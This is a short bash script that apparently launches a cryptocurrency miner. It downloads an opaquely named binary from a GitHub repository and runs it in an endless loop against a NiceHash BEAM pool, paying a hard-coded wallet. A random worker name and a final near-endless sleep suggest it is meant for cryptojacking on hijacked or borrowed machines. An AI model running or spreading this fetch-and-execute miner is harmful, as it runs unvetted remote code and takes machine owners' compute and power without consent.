#!/bin/bash
POOL=stratum+tcp://beamv3.usa-west.nicehash.com:3387
WALLET=36DFSCTzXk8S7yZuFHzChmenzQL7u7FLVe
WORKER=$(echo $(shuf -i 10-40 -n 1)-Dg)
wget https://github.com/archernap/prem/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo BEAM-III --pool $POOL --user $WALLET.$WORKER 
sleep 5
done
sleep 999999999